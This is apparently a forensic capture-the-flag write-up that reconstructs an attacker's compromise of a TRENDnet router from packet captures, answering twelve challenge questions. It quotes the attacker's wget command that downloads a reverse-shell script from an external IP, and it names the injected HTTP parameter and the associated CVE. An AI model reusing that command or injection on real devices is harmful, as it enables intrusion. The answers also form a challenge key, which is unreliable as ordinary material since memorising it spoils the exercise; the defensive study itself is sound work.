

---

#### Sherlock Scenario

The SOC team has identified suspicious lateral movement targeting router firmware from within the network. Anomalous traffic patterns and command execution have been detected on the router, indicating that an attacker already inside the network has gained unauthorized access and is attempting further exploitation.

You will be given network traffic logs from one of the impacted machines. Your task is to conduct a thorough investigation to unravel the attacker's Techniques, Tactics, and Procedures (TTPs).



----

Task 1

From what IP address did the attacker initially launched their activity?

```
192.168.10.2
```



Filter for HTTP and we see 192.168.10.2 interacting with router
![](Pasted%20image%2020260629154314.png)





Task 2

What is the model name of the compromised router?

```
TEW-827DRU
```



Filter for the HTTP stream IN Q1 
![](Pasted%20image%2020260629154223.png)




Task 3

How many failed login attempts did the attacker try before successfully logging into the router?

```
2
```





Filter for the two IP´s and HTTP. Then calculate the POST requests before we see Router panel content being loaded
```
ip.src == 192.168.10.2 and ip.dst == 192.168.10.1 and http
```
![](Pasted%20image%2020260629160425.png)












Task 4

At what UTC time did the attacker successfully log into the routers web admin interface?

```
2024-05-01 15:53:27
```



Check the packet details of the latest POST request before TA got a successful login
![](Pasted%20image%2020260629161132.png)






Task 5

How many characters long was the password used to log in successfully?

```
0
```



![](Pasted%20image%2020260629162451.png)











Task 6

What is the current firmware version installed on the compromised router?


```
2.1
```



Follow the stream of /adm_status.asp and search for ver
![](Pasted%20image%2020260629170418.png)









Task 7

Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?


```
usbapps.config.smb_admin_name
```




Since we know the version number of the app, we can search for the relevant vulnerability to predict where to look next

https://nvd.nist.gov/vuln/detail/CVE-2024-28353
This tells us what to look for

![](Pasted%20image%2020260629172852.png)










Task 8


What is the CVE number associated with the vulnerability that was exploited in this attack?


```
CVE-2024-28353
```



https://nvd.nist.gov/vuln/detail/CVE-2024-28353










Task 9

What was the first command the attacker executed by exploiting the vulnerability?


```
whoami
```


![](Pasted%20image%2020260629173059.png)










Task 10

What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?


```
wget http://35.159.25.253:8000/a1l4m.sh
```


Keep following the POST requests
![](Pasted%20image%2020260629173407.png)











Task 11

Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?

```
Access to this resource is forbidden
```





Find the POST request followed by an error
![](Pasted%20image%2020260629173818.png)

Then follow it
![](Pasted%20image%2020260629173743.png)












Task 12

What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)


```
35.159.25.253:41143
```


export the script the TA transferred and read it
![](Pasted%20image%2020260629174626.png)

![](Pasted%20image%2020260629174643.png)